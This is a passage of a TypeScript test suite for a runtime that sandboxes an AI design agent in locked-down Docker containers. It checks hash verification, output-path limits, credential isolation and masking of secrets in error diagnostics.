import crypto from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import vm from 'node:vm';
import { afterEach, describe, expect, it, vi } from 'vitest';

import {
  AgentWorkspaceRuntimeError,
  AgentWorkspaceSessionRuntime,
  MAP_DESIGN_WORKSPACE_SCHEMA,
  canAcceptUntrackedWorkspaceEdit,
  hardenSelfContainedHtml,
  normalizeWorkspaceTransfer,
} from '../../src/services/agent-workspace-session-runtime.js';
import type { ExecOptions, ExecResult, IShellExecutor } from '../../src/types.js';

function digest(value: Buffer | string): string {
  return crypto.createHash('sha256').update(value).digest('hex');
}

function result(stdout = '', stderr = '', exitCode = 0): ExecResult {
  return { stdout, stderr, exitCode };
}

function storageCapabilityResult(command: string): ExecResult | null {
  if (command.startsWith('docker volume create') && command.includes('storage-probe')) {
    return result('probe-volume\n');
  }
  if (command.startsWith('docker run --rm') && command.includes('/cds-storage-probe')) {
    return result('hard-limit-enforced\n');
  }
  if (command.startsWith('docker volume rm ') && command.includes('storage-probe')) {
    return result('removed\n');
  }
  return null;
}

function deferred<T>() {
  let resolve!: (value: T) => void;
  let reject!: (reason?: unknown) => void;
  const promise = new Promise<T>((resolvePromise, rejectPromise) => {
    resolve = resolvePromise;
    reject = rejectPromise;
  });
  return { promise, resolve, reject };
}

class RecordingShell implements IShellExecutor {
  readonly calls: Array<{ command: string; options?: ExecOptions }> = [];
  readonly envFiles: Array<{ command: string; path: string; content: string; mode: number }> = [];
  readonly successfulCleanupCommands = new Set<string>();
  workspaceDir = '';
  failEgressConnect = false;
  failEgressRun = false;
  egressHealthFailures = 0;
  failContainerCreate = false;
  failVolumeInit = false;
  failTemplateInit = false;
  volumeCleanupFailures = 0;
  egressCleanupFailures = 0;
  outputPreflightFailure: 'total_bytes' | 'file_count' | 'workspace_file_count' | 'node_count' | 'directory_depth' | 'special_file' | 'path_not_allowed' | null = null;
  returnNoSuchForRepeatedCleanup = false;
  failStorageCapability = false;

  async exec(command: string, options?: ExecOptions): Promise<ExecResult> {
    this.calls.push({ command, options });
    const envFile = command.match(/--env-file '([^']+)'/);
    if (envFile) {
      this.envFiles.push({
        command,
        path: envFile[1],
        content: fs.readFileSync(envFile[1], 'utf8'),
        mode: fs.statSync(envFile[1]).mode & 0o777,
      });
    }
    if (command.startsWith('docker version')) return result('27.0.0\n');
    if (command.startsWith('docker image inspect')) return result('sha256:image\n');
    if (command.includes('/cds-storage-probe') && this.failStorageCapability) {
      return result('', 'storage limit was not enforced', 1);
    }
    if (command.includes('--entrypoint /bin/sh') && !command.includes('--cap-add CHOWN')) {
      return result('/usr/local/bin/opencode\n');
    }
    if (command.startsWith('docker network create')) return result('network-id\n');
    if (command.startsWith('docker volume create')) return result('volume-id\n');
    if (command.startsWith('docker create ')) {
      if (this.failContainerCreate) {
        const daemonApiToken = this.envFiles.at(-1)?.content.match(/^OD_API_TOKEN=(.+)$/m)?.[1] || '';
        return result(
          `transfer-token ${daemonApiToken} ${'x'.repeat(4_096)}`,
          `OD_API_TOKEN=${daemonApiToken}\ntransferToken=transfer-token\ncommand=${command}`,
          125,
        );
      }
      return result('container-id\n');
    }
    if (command.startsWith('docker cp ')) {
      const inbound = command.match(/^docker cp '([^']+)\/\.' 'cds-od-[^']+:\/workspace\/'$/);
      if (inbound) this.workspaceDir = inbound[1];
      const outbound = command.match(/^docker cp 'cds-od-[^']+:\/workspace\/\.' '([^']+)'$/);
      if (outbound && this.workspaceDir) {
        fs.cpSync(this.workspaceDir, outbound[1], { recursive: true });
      }
      return result('copied\n');
    }
    if (command.startsWith('docker run --detach') && this.failEgressRun) {
      return result('', 'relay process failed after allocation', 125);
    }
    if (command.startsWith('docker run ')) {
      if (this.failVolumeInit && command.includes('--cap-add CHOWN')) {
        return result('', `${'volume init denied '.repeat(256)}\n`, 126);
      }
      return result('container-id\n');
    }
    if (command.startsWith('docker start ')) return result('started\n');
    if (command.startsWith('docker network connect ')) {
      return this.failEgressConnect ? result('', 'connect denied', 1) : result('connected\n');
    }
    if (command.startsWith('docker exec ')) {
      if (command.includes('CDS_OUTPUT_PREFLIGHT=1') && this.outputPreflightFailure) {
        const rejectedPath = this.outputPreflightFailure === 'path_not_allowed'
          ? `:${Buffer.from('unexpected/runtime-state.json').toString('base64url')}`
          : '';
        return result('', `CDS_OUTPUT_PREFLIGHT:${this.outputPreflightFailure}${rejectedPath}`, 1);
      }
      if (this.failTemplateInit && command.includes('design-templates/web-prototype')) {
        return result('', 'web prototype resources missing', 1);
      }
      if (command.includes('/__health') && this.egressHealthFailures > 0) {
        this.egressHealthFailures -= 1;
        return result('', 'relay starting', 1);
      }
      return result('ready\n');
    }
    if (command.startsWith('docker inspect ')) return result('127.0.0.1\n');
    if (command.startsWith('docker rm -f ')) {
      if (command.includes('cds-od-egress-') && this.egressCleanupFailures > 0) {
        this.egressCleanupFailures -= 1;
        return result('', 'egress container is busy', 1);
      }
      if (this.returnNoSuchForRepeatedCleanup && this.successfulCleanupCommands.has(command)) {
        return result('', 'No such container', 1);
      }
      this.successfulCleanupCommands.add(command);
      return result('removed\n');
    }
    if (command.startsWith('docker network rm ')) {
      if (this.returnNoSuchForRepeatedCleanup && this.successfulCleanupCommands.has(command)) {
        return result('', 'No such network', 1);
      }
      this.successfulCleanupCommands.add(command);
      return result('removed\n');
    }
    if (command.startsWith('docker volume rm ')) {
      if (!command.includes('storage-probe') && this.volumeCleanupFailures > 0) {
        this.volumeCleanupFailures -= 1;
        return result('', 'volume is still in use', 1);
      }
      if (this.returnNoSuchForRepeatedCleanup && this.successfulCleanupCommands.has(command)) {
        return result('', 'No such volume', 1);
      }
      this.successfulCleanupCommands.add(command);
      return result('removed\n');
    }
    return result();
  }
}

function buildPackage(files: Array<{ path: string; content: string; mediaType: string }>) {
  const body = {
    schemaVersion: MAP_DESIGN_WORKSPACE_SCHEMA,
    runId: 'map-run-1',
    baseRevision: 'rev-1',
    files: files.map((file) => {
      const bytes = Buffer.from(file.content);
      return {
        path: file.path,
        contentBase64: bytes.toString('base64'),
        sha256: digest(bytes),
        size: bytes.byteLength,
        mediaType: file.mediaType,
      };
    }),
  };
  const serialized = Buffer.from(JSON.stringify(body));
  return { body, serialized, sha256: digest(serialized) };
}

describe('AgentWorkspaceSessionRuntime', () => {
  let rootDir = '';

  afterEach(() => {
    vi.useRealTimers();
    if (rootDir) fs.rmSync(rootDir, { recursive: true, force: true });
  });

  it('accepts OpenDesign no_artifact only for a changed existing workspace page', () => {
    const current = Buffer.from('<!doctype html><html><body>Current</body></html>');
    const changed = Buffer.from('<!doctype html><html><body>Changed</body></html>');

    expect(canAcceptUntrackedWorkspaceEdit('no_artifact', current, changed)).toBe(true);
    expect(canAcceptUntrackedWorkspaceEdit('no_artifact', current, Buffer.from(current))).toBe(false);
    expect(canAcceptUntrackedWorkspaceEdit('no_artifact', undefined, changed)).toBe(false);
    expect(canAcceptUntrackedWorkspaceEdit('unsafe_output', current, changed)).toBe(false);
  });

  it('materializes a verified package, runs an isolated OpenDesign container, and commits only allowed outputs', async () => {
    rootDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cds-agent-workspace-test-'));
    const workspacePackage = buildPackage([
      { path: 'knowledge/source.md', content: 'Private knowledge body', mediaType: 'text/markdown' },
      { path: 'brief.txt', content: 'Build a launch page', mediaType: 'text/plain' },
      { path: 'current/index.html', content: '<!doctype html><html><body>Current page</body></html>', mediaType: 'text/html' },
    ]);
    const requests: Array<{ path: string; authorization: string; body?: any }> = [];
    const shell = new RecordingShell();
    shell.egressHealthFailures = 3;
    const fakeFetch: typeof fetch = async (input, init) => {
      const url = new URL(typeof input === 'string' ? input : input instanceof URL ? input : input.url);
      const requestPath = url.pathname;
      const headers = new Headers(init?.headers);
      const authorization = headers.get('Authorization') || '';
      const raw = typeof init?.body === 'string' ? init.body : '';
      const body = raw ? JSON.parse(raw) : undefined;
      requests.push({ path: requestPath, authorization, body });
      if (requestPath === '/input') {
        return authorization === 'Bearer transfer-token'
          ? new Response(workspacePackage.serialized, { status: 200, headers: { 'Content-Type': 'application/json' } })
          : new Response('', { status: 401 });
      }
      if (requestPath === '/api/health') return Response.json({ ok: true });
      if (requestPath === '/api/import/folder') {
        return Response.json({
          project: { id: 'od-project', skillId: 'web-prototype' },
          conversationId: 'od-conversation',
        });
      }
      if (requestPath === '/api/runs' && init?.method === 'POST') {
          fs.writeFileSync(
            path.join(shell.workspaceDir, 'index.html'),
            '<!doctype html><html><body>Generated</body></html>',
          );
          fs.mkdirSync(path.join(shell.workspaceDir, 'assets'), { recursive: true });
          fs.writeFileSync(path.join(shell.workspaceDir, 'assets', 'app.css'), 'body{color:blue}');
          fs.writeFileSync(path.join(shell.workspaceDir, 'manifest.json'), '{"untrusted":true}');
          fs.writeFileSync(path.join(shell.workspaceDir, 'index.html.artifact.json'), '{"runtime":"metadata"}');
        return Response.json({ runId: 'od-run-1' }, { status: 202 });
      }
      if (requestPath === '/api/runs/od-run-1' && init?.method === 'GET') {
        return Response.json({ status: 'succeeded', deliverableValid: false, deliverableValidation: 'no_artifact' });
      }
      if (requestPath === '/commit') {
        return authorization === 'Bearer transfer-token'
          ? Response.json({ artifactRef: 'artifact:result-1', resultSha256: digest(raw) })
          : new Response('', { status: 401 });
      }
      if (requestPath === '/api/runs/od-run-1/cancel') return Response.json({});
      return new Response('', { status: 404 });
    };
    const runtime = new AgentWorkspaceSessionRuntime(shell, {
      rootDir,
      instanceId: 'instance-a',
      daemonPort: 7456,
      fetchImpl: fakeFetch,
      pollIntervalMs: 5,
      capabilityCacheMs: 0,
      containerUid: process.getuid?.() ?? 1001,
      containerGid: process.getgid?.() ?? 1001,
    });
    const transfer = {
      schemaVersion: MAP_DESIGN_WORKSPACE_SCHEMA,
      inputPackageUrl: 'https://map.example.test/input',
      resultCommitUrl: 'https://map.example.test/commit',
      transferToken: 'transfer-token',
      inputSha256: workspacePackage.sha256,
      baseRevision: 'rev-1',
      maxInputBytes: 1024 * 1024,
      maxOutputBytes: 1024 * 1024,
      allowedOutputPaths: ['index.html', 'manifest.json', 'assets/**'],
    };

    const created = await runtime.create(
      'session-test-1',
      transfer,
      {
        cpuCores: 1,
        memoryMb: 768,
        timeoutSeconds: 30,
        networkPolicy: 'egress-only',
        autoCleanupMinutes: 5,
      },
    );

    expect(fs.readFileSync(path.join(created.workspaceDir, 'knowledge', 'source.md'), 'utf8'))
      .toBe('Private knowledge body');
    const runCommand = shell.calls.find((call) => call.command.startsWith('docker create'));
    expect(runCommand?.command).toContain('--read-only');
    expect(runCommand?.command).toContain('--security-opt no-new-privileges:true');
    expect(runCommand?.command).toContain('--cap-drop ALL');
    expect(runCommand?.command).toContain('--pids-limit 256');
    expect(runCommand?.command).toContain('--tmpfs /tmp:rw,noexec,nosuid,size=128m,nr_inodes=2048');
    expect(runCommand?.command).toContain("--tmpfs '/app/design-templates:rw,noexec,nosuid,size=8m");
    expect(runCommand?.command).toContain('nr_inodes=512');
    expect(runCommand?.command).toContain('ghcr.io/inernoro/prd_agent/opendesign-runtime@sha256:c4d2d53a21fa31adfb8b4b0dc189d6e8db3b7543f93c231c3574a75baf33f474');
    expect(runCommand?.command).toContain('type=volume');
    expect(runCommand?.command).not.toContain('type=bind');
    expect(runCommand?.command).toContain("--label 'cds.instance=instance-a'");
    expect(shell.calls.some((call) => call.command.startsWith('docker network create --internal'))).toBe(true);
    expect(shell.calls.some((call) => call.command.startsWith('docker cp '))).toBe(true);
    const storageKeeperRun = shell.calls.find((call) => (
      call.command.startsWith('docker run --detach') && call.command.includes('-storage')
    ));
    expect(storageKeeperRun?.command).toContain('while :; do sleep 300; done');
    expect(storageKeeperRun?.command).toContain(`--label 'cds.agent.session=session-test-1'`);
    const mainContainerStartIndex = shell.calls.findIndex((call) => call.command.startsWith('docker start '));
    const storageKeeperRemoveIndex = shell.calls.findIndex((call) => (
      call.command.startsWith('docker rm -f ') && call.command.includes('-storage')
    ));
    expect(storageKeeperRemoveIndex).toBeGreaterThan(mainContainerStartIndex);
    expect(runCommand?.command).not.toContain('transfer-token');
    expect(runCommand?.command).not.toContain('model-secret');
    expect(runCommand?.command).not.toContain('/dev/stdin');
    expect(runCommand?.options?.stdin).toBeUndefined();
    const sessionVolumeCreates = shell.calls.filter((call) => (
      call.command.startsWith('docker volume create')
      && call.command.includes('cds.agent.session=session-test-1')
    ));
    expect(sessionVolumeCreates).toHaveLength(2);
    for (const call of sessionVolumeCreates) {
      expect(call.command).toContain('--driver local');
      expect(call.command).toContain('--opt type=tmpfs');
      expect(call.command).toContain('--opt device=tmpfs');
      expect(call.command).toContain("--opt 'o=size=");
      expect(call.command).toContain('nr_inodes=4096');
    }
    expect(shell.envFiles[0]?.mode).toBe(0o600);
    expect(shell.envFiles[0]?.content).not.toContain('transfer-token');
    expect(shell.envFiles[0]?.content).not.toContain('model-secret');
    expect(fs.existsSync(shell.envFiles[0]?.path || '')).toBe(false);
    const preparedDesignTemplate = shell.calls.find((call) => (
      call.command.startsWith('docker exec ') && call.command.includes('design-templates/web-prototype')
    ));
    expect(preparedDesignTemplate?.command).toContain('/app/plugins/_official/examples/web-prototype/.');
    expect(preparedDesignTemplate?.command).toContain('/app/design-templates/web-prototype/assets/template.html');
    expect(preparedDesignTemplate?.command).toContain('/app/design-templates/web-prototype/references/layouts.md');
    expect(preparedDesignTemplate?.command).toContain('/app/design-templates/web-prototype/references/checklist.md');
    expect(preparedDesignTemplate?.command).toContain('/workspace/.od-skills/web-prototype/assets/template.html');
    expect(preparedDesignTemplate?.command).toContain('/workspace/.od-skills/web-prototype/references/layouts.md');
    expect(preparedDesignTemplate?.command).toContain('/workspace/.od-skills/web-prototype/references/checklist.md');
    expect(preparedDesignTemplate?.command).toContain('if [ -f /workspace/current/index.html ]; then cp /workspace/current/index.html /workspace/index.html;');
    expect(preparedDesignTemplate?.command).toContain('elif [ ! -f /workspace/index.html ]; then cp /app/plugins/_official/examples/web-prototype/assets/template.html /workspace/index.html; fi');
    expect(preparedDesignTemplate?.command).toContain('test -f /workspace/index.html');

    const executed = await runtime.execute(
      'session-test-1',
      'Make the page visually polished.',
      {
        baseUrl: 'https://map.example.test/api/design-artifacts/runtime/run-1/llm/v1',
        protocol: 'openai',
        apiKey: 'model-secret',
        model: 'map-managed',
      },
      'transfer-token',
    );

    expect(executed).toMatchObject({
      artifactRef: 'artifact:result-1',
      openDesignRunId: 'od-run-1',
      files: [
        { path: 'assets/app.css' },
        { path: 'index.html' },
        { path: 'manifest.json' },
      ],
    });
    const preflightIndex = shell.calls.findIndex((call) => call.command.includes('CDS_OUTPUT_PREFLIGHT=1'));
    const preflightCommand = shell.calls[preflightIndex]?.command || '';
    const outboundCopyIndex = shell.calls.findIndex((call) => (
      call.command.startsWith('docker cp ') && call.command.includes(':/workspace/.')
    ));
    expect(preflightIndex).toBeGreaterThan(-1);
    expect(outboundCopyIndex).toBeGreaterThan(preflightIndex);
    expect(preflightCommand).toContain('special_file');
    expect(preflightCommand).toContain('file_count');
    expect(preflightCommand).toContain('total_bytes');
    expect(preflightCommand).toContain('path_not_allowed');
    const encodedPreflightConfig = preflightCommand.match(/CDS_OUTPUT_PREFLIGHT_CONFIG=([A-Za-z0-9+/=]+)/)?.[1] || '';
    expect(JSON.parse(Buffer.from(encodedPreflightConfig, 'base64').toString('utf8'))).toEqual({
      allowedOutputPaths: ['index.html', 'manifest.json', 'assets/**'],
      inputPaths: ['knowledge/source.md', 'brief.txt', 'current/index.html'],
      ignoredRuntimePaths: ['index.html.artifact.json'],
      maxFileCount: 100,
      maxWorkspaceFileCount: 1024,
      maxNodeCount: 2048,
      maxDirectoryDepth: 16,
      maxOutputBytes: 1024 * 1024,
    });
    const egressRun = shell.calls.find((call) => (
      call.command.startsWith('docker run --detach') && call.command.includes('cds-od-egress-')
    ));
    const egressEnv = shell.envFiles.find((entry) => entry.command === egressRun?.command);
    expect(egressRun?.command).toContain('--tmpfs /tmp:rw,noexec,nosuid,size=16m,nr_inodes=256');
    expect(egressRun?.command).not.toContain('/dev/stdin');
    expect(egressRun?.options?.stdin).toBeUndefined();
    expect(egressEnv?.mode).toBe(0o600);
    expect(egressEnv?.content).toContain('TARGET_ORIGIN=https://map.example.test');
    expect(egressEnv?.content).toContain('MAP_MODEL_TICKET=model-secret');
    expect(fs.existsSync(egressEnv?.path || '')).toBe(false);
    const encodedProxyScript = egressEnv?.content.match(/^CDS_EGRESS_PROXY_SCRIPT=(.+)$/m)?.[1] || '';
    const proxyScript = Buffer.from(encodedProxyScript, 'base64').toString('utf8');
    let relayHandler: ((request: any, response: any) => void) | undefined;
    let upstreamOptions: Record<string, any> | undefined;
    const relayServer = {
      on: vi.fn().mockReturnThis(),
      listen: vi.fn(),
    };
    const upstreamRequest = {
      on: vi.fn().mockReturnThis(),
    };
    vm.runInNewContext(proxyScript, {
      URL,
      console,
      process: {
        env: {
          TARGET_ORIGIN: 'https://map.example.test',
          TARGET_PATH_PREFIX: '/api/design-artifacts/runtime/run-1/llm/v1',
          PROXY_PORT: '8787',
          MAP_MODEL_TICKET: 'model-secret',
        },
      },
      require: (specifier: string) => {
        if (specifier === 'node:http') {
          return {
            createServer: (handler: (request: any, response: any) => void) => {
              relayHandler = handler;
              return relayServer;
            },
          };
        }
        if (specifier === 'node:https') {
          return {
            request: (options: Record<string, any>) => {
              upstreamOptions = options;
              return upstreamRequest;
            },
          };
        }
        if (specifier === 'node:dns') {
          return {
            lookup: (_hostname: string, _options: unknown, callback: Function) => callback(null, [
              { address: '203.0.113.10', family: 4 },
            ]),
          };
        }
        if (specifier === 'node:net') {
          return { isIP: (address: string) => address.includes(':') ? 6 : 4 };
        }
        throw new Error(`Unexpected proxy dependency: ${specifier}`);
      },
    });
    expect(relayHandler).toBeTypeOf('function');
    relayHandler?.({
      method: 'POST',
      url: '/api/design-artifacts/runtime/run-1/llm/v1/chat/completions',
      headers: {
        authorization: 'Bearer agent-forged-secret',
        'x-api-key': 'agent-forged-api-key',
        'anthropic-api-key': 'agent-forged-anthropic-key',
        cookie: 'agent-session-cookie',
      },
      pipe: vi.fn(),
    }, {
      writeHead: vi.fn(),
      end: vi.fn(),
    });
    expect(upstreamOptions?.lookup).toBeTypeOf('function');
    expect(upstreamOptions?.headers).toMatchObject({
      authorization: 'Bearer model-secret',
      host: 'map.example.test',
    });
    expect(upstreamOptions?.headers).not.toHaveProperty('x-api-key');
    expect(upstreamOptions?.headers).not.toHaveProperty('anthropic-api-key');
    expect(upstreamOptions?.headers).not.toHaveProperty('cookie');
    const allLookup = vi.fn();
    upstreamOptions?.lookup('map.example.test', { all: true }, allLookup);
    expect(allLookup).toHaveBeenCalledWith(null, [{ address: '203.0.113.10', family: 4 }]);
    const singleLookup = vi.fn();
    upstreamOptions?.lookup('map.example.test', {}, singleLookup);
    expect(singleLookup).toHaveBeenCalledWith(null, '203.0.113.10', 4);
    const imported = requests.find((request) => request.path === '/api/import/folder');
    expect(imported?.body).toMatchObject({
      baseDir: '/workspace',
      skillId: 'web-prototype',
      orchestratorWorkspace: {
        kind: 'scratch',
        baseRevision: 'rev-1',
        writeback: 'external',
      },
    });
    const designRuns = requests.filter((request) => request.path === '/api/runs');
    expect(designRuns).toHaveLength(2);
    const run = designRuns[0];
    expect(run?.body).toMatchObject({
      projectId: 'od-project',
      conversationId: 'od-conversation',
      agentId: 'byok-opencode',
      model: 'map-managed',
      message: 'Make the page visually polished.',
      byokProvider: {
        protocol: 'openai',
        apiKey: expect.stringMatching(/^cds-placeholder-[A-Za-z0-9_-]+$/),
        baseUrl: 'http://map-egress:8787/api/design-artifacts/runtime/run-1/llm/v1',
        model: 'map-managed',
      },
    });
    expect(JSON.stringify(designRuns)).not.toContain('model-secret');
    expect(JSON.stringify(run?.body)).not.toContain('agent-forged-secret');
    expect(run?.body.systemPrompt).toContain('/workspace/.od-skills/web-prototype/assets/template.html');
    expect(run?.body.systemPrompt).toContain('/workspace/.od-skills/web-prototype/references/layouts.md');
    expect(run?.body.systemPrompt).toContain('/workspace/.od-skills/web-prototype/references/checklist.md');
    expect(run?.body.systemPrompt).toContain('Read /workspace/brief/task.json first');
    expect(run?.body.systemPrompt).toContain('Read every knowledge source before editing: /workspace/knowledge/source.md');
    expect(run?.body.systemPrompt).toContain('it is the exact current published page and must remain the starting point');
    expect(run?.body.systemPrompt).toContain('Never replace the product identity with OpenDesign');
    expect(run?.body.systemPrompt).toContain('Remove every unresolved placeholder');
    expect(run?.body.systemPrompt).toContain('do not resolve them as /workspace/assets or /workspace/references');
    expect(run?.body.systemPrompt).toContain('A starting /workspace/index.html already exists');
    expect(run?.body.systemPrompt).toContain('small targeted edit operations');
    expect(run?.body.systemPrompt).toContain('never replace the whole document with one write operation');
    expect(run?.body.systemPrompt).toContain('do not include JavaScript, script elements, inline event handlers');
    expect(run?.body.systemPrompt).not.toContain('inline all CSS, JavaScript');
    expect(designRuns[1]?.body.message).toContain('Perform a strict final review');
    expect(designRuns[1]?.body.message).toContain('/workspace/brief/task.json');
    expect(designRuns[1]?.body.message).toContain('Never use broad or global string replacement');
    expect(designRuns[1]?.body.message).toContain('Never alter CSS values');
    expect(designRuns[1]?.body.message).toContain('keep the existing content unchanged');
    expect(designRuns[1]?.body.conversationId).toBe('od-conversation');
    expect(JSON.stringify(run?.body)).not.toContain('Private knowledge body');
    expect(shell.calls.filter((call) => call.command.includes('/__health'))).toHaveLength(4);
    const sessionResourceCreates = shell.calls.filter((call) =>
      call.command.includes('cds.type=agent-session') && (
        call.command.startsWith('docker network create')
        || call.command.startsWith('docker volume create')
        || call.command.startsWith('docker create')
        || call.command.startsWith('docker run --rm')
        || call.command.startsWith('docker run --detach')
      ),
    );
    expect(sessionResourceCreates.length).toBeGreaterThanOrEqual(6);
    for (const call of sessionResourceCreates) {
      expect(call.command).toContain('cds.instance=instance-a');
      expect(call.command).not.toContain('model-secret');
    }
    expect(shell.calls.every((call) => !call.command.includes('model-secret'))).toBe(true);
    const volumeInitCall = shell.calls.find((call) => (
      call.command.startsWith('docker run --rm') && call.command.includes('--cap-add CHOWN')
    ));
    expect(volumeInitCall?.command).toContain(
      `chown ${process.getuid?.() ?? 1001}:${process.getgid?.() ?? 1001} /workspace /app/.od`,
    );
    expect(volumeInitCall?.command).not.toContain('chmod -R');
    expect(volumeInitCall?.command).not.toContain('chown -R');
    expect(fs.statSync(path.join(created.workspaceDir, 'brief.txt')).mode & 0o777).toBe(0o644);
    expect(fs.statSync(path.join(created.workspaceDir, 'knowledge')).mode & 0o777).toBe(0o755);
    expect(fs.statSync(path.join(created.workspaceDir, 'knowledge', 'source.md')).mode & 0o777).toBe(0o644);
    const committed = requests.find((request) => request.path === '/commit');
    expect(committed?.authorization).toBe('Bearer transfer-token');
    expect(committed?.body.runId).toBe('map-run-1');
    expect(committed?.body.files.map((file: any) => file.path)).toEqual([
      'assets/app.css',
      'index.html',
      'manifest.json',
    ]);
    const committedManifest = committed?.body.files.find((file: any) => file.path === 'manifest.json');
    expect(JSON.parse(Buffer.from(committedManifest.contentBase64, 'base64').toString('utf8'))).toEqual({
      schemaVersion: 'map-design-artifact-manifest-v1',
      baseRevision: 'rev-1',
      entryFile: 'index.html',
      files: [
        expect.objectContaining({ path: 'assets/app.css' }),
        expect.objectContaining({ path: 'index.html' }),
      ],
    });
    const committedIndex = committed?.body.files.find((file: any) => file.path === 'index.html');
    expect(Buffer.from(committedIndex.contentBase64, 'base64').toString('utf8')).toContain(
      `default-src 'none'; base-uri 'none'; connect-src 'none'`,
    );

    await runtime.stop('session-test-1');
    expect(runtime.has('session-test-1')).toBe(false);
    expect(fs.existsSync(created.hostRoot)).toBe(false);
    expect(shell.calls.some((call) => call.command.startsWith('docker rm -f '))).toBe(true);
    expect(shell.calls.some((call) => call.command.startsWith('docker network rm '))).toBe(true);
    expect(shell.calls.filter((call) => (
      call.command.startsWith('docker volume rm ') && !call.command.includes('storage-probe')
    ))).toHaveLength(2);
  });

  it('fails closed on package hash mismatch and removes the allocated host root', async () => {
    rootDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cds-agent-workspace-test-'));
    const workspacePackage = buildPackage([
      { path: 'brief.txt', content: 'brief', mediaType: 'text/plain' },
    ]);
    const shell = new RecordingShell();
    const runtime = new AgentWorkspaceSessionRuntime(shell, {
      rootDir,
      daemonPort: 7456,
      capabilityCacheMs: 0,
      containerUid: process.getuid?.() ?? 1001,
      containerGid: process.getgid?.() ?? 1001,
      fetchImpl: async () => new Response(workspacePackage.serialized, {
        status: 200,
        headers: { 'Content-Type': 'application/json' },
      }),
    });

    await expect(runtime.create(
      'session-test-hash',
      {
        schemaVersion: MAP_DESIGN_WORKSPACE_SCHEMA,
        inputPackageUrl: 'https://map.example.test/input',
        resultCommitUrl: 'https://map.example.test/commit',
        transferToken: 'transfer-token',
        inputSha256: '0'.repeat(64),
        baseRevision: 'rev-1',
        maxInputBytes: 1024,
        maxOutputBytes: 1024,
        allowedOutputPaths: ['index.html', 'manifest.json'],
      },
      {
        cpuCores: 1,
        memoryMb: 768,
        timeoutSeconds: 30,
        networkPolicy: 'egress-only',
        autoCleanupMinutes: 5,
      },
    )).rejects.toMatchObject<Partial<AgentWorkspaceRuntimeError>>({ code: 'workspace_package_hash_mismatch' });
    expect(fs.readdirSync(rootDir)).toEqual([]);
    expect(shell.calls.some((call) => call.command.startsWith('docker network create'))).toBe(false);
  });

  it('returns bounded and credential-safe diagnostics when Docker cannot create the container', async () => {
    rootDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cds-agent-workspace-test-'));
    const workspacePackage = buildPackage([
      { path: 'brief.txt', content: 'brief', mediaType: 'text/plain' },
    ]);
    const shell = new RecordingShell();
    shell.failContainerCreate = true;
    const runtime = new AgentWorkspaceSessionRuntime(shell, {
      rootDir,
      instanceId: 'instance-a',
      capabilityCacheMs: 0,
      containerUid: process.getuid?.() ?? 1001,
      containerGid: process.getgid?.() ?? 1001,
      fetchImpl: async () => new Response(workspacePackage.serialized, {
        status: 200,
        headers: { 'Content-Type': 'application/json' },
      }),
    });

    const error = await runtime.create('session-create-failure', {
      schemaVersion: MAP_DESIGN_WORKSPACE_SCHEMA,
      inputPackageUrl: 'https://map.example.test/input',
      resultCommitUrl: 'https://map.example.test/commit',
      transferToken: 'transfer-token',
      inputSha256: workspacePackage.sha256,
      baseRevision: 'rev-1',
      maxInputBytes: 1024,
      maxOutputBytes: 1024,
      allowedOutputPaths: ['index.html', 'manifest.json'],
    }, {
      cpuCores: 1,
      memoryMb: 768,
      timeoutSeconds: 30,
      networkPolicy: 'egress-only',
      autoCleanupMinutes: 5,
    }).catch((caught: unknown) => caught);

    expect(error).toBeInstanceOf(AgentWorkspaceRuntimeError);
    expect(error).toMatchObject({
      code: 'workspace_container_create_failed',
      message: 'OpenDesign container failed to be created',
      retryable: true,
      details: {
        stage: 'docker_create',
        exitCode: 125,
        stderrPreview: expect.any(String),
        stdoutPreview: expect.any(String),
      },
    });
    const runtimeError = error as AgentWorkspaceRuntimeError;
    const details = runtimeError.details || {};
    const serializedDetails = JSON.stringify(details);
    const createCall = shell.calls.find((call) => call.command.startsWith('docker create '));
    const daemonApiToken = shell.envFiles.find((entry) => entry.command === createCall?.command)
      ?.content.match(/^OD_API_TOKEN=(.+)$/m)?.[1] || '';
    expect(daemonApiToken).not.toBe('');
    expect(serializedDetails).not.toContain(daemonApiToken);
    expect(serializedDetails).not.toContain('transfer-token');
    expect(serializedDetails).not.toContain(createCall?.command || 'docker create');
    expect(details).not.toHaveProperty('stdin');
    expect(details).not.toHaveProperty('command');
    expect(createCall?.command).not.toContain('/dev/stdin');
    expect(createCall?.command).not.toContain('--workdir /workspace');
    expect(createCall?.options?.stdin).toBeUndefined();
    expect(shell.envFiles.find((entry) => entry.command === createCall?.command)?.mode).toBe(0o600);
    expect(fs.existsSync(shell.envFiles.find((entry) => entry.command === createCall?.command)?.path || '')).toBe(false);
    expect(String(details.stderrPreview)).toContain('***[masked]***');
    expect(String(details.stdoutPreview)).toContain('cds runtime diagnostic truncated');
    expect(Buffer.byteLength(String(details.stderrPreview), 'utf8')).toBeLessThanOrEqual(2 * 1024);
    expect(Buffer.byteLength(String(details.stdoutPreview), 'utf8')).toBeLessThanOrEqual(2 * 1024);
    expect(fs.readdirSync(rootDir)).toEqual([]);
  });

  it('returns bounded diagnostics when workspace volume ownership initialization fails', async () => {
    rootDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cds-agent-workspace-test-'));
    const workspacePackage = buildPackage([
      { path: 'brief.txt', content: 'brief', mediaType: 'text/plain' },
    ]);
    const shell = new RecordingShell();
    shell.failVolumeInit = true;
    const runtime = new AgentWorkspaceSessionRuntime(shell, {
      rootDir,
      instanceId: 'instance-a',
      capabilityCacheMs: 0,
      containerUid: process.getuid?.() ?? 1001,
      containerGid: process.getgid?.() ?? 1001,
      fetchImpl: async () => new Response(workspacePackage.serialized, {
        status: 200,
        headers: { 'Content-Type': 'application/json' },
      }),
    });

    const error = await runtime.create('session-volume-init-failure', {
      schemaVersion: MAP_DESIGN_WORKSPACE_SCHEMA,
      inputPackageUrl: 'https://map.example.test/input',
      resultCommitUrl: 'https://map.example.test/commit',
      transferToken: 'transfer-token',
      inputSha256: workspacePackage.sha256,
      baseRevision: 'rev-1',
      maxInputBytes: 1024,
      maxOutputBytes: 1024,
      allowedOutputPaths: ['index.html', 'manifest.json'],
    }, {
      cpuCores: 1,
      memoryMb: 768,
      timeoutSeconds: 30,
      networkPolicy: 'egress-only',
      autoCleanupMinutes: 5,
    }).catch((caught: unknown) => caught);

    expect(error).toMatchObject({
      code: 'workspace_volume_init_failed',
      retryable: true,
      details: {
        stage: 'docker_volume_init',
        exitCode: 126,
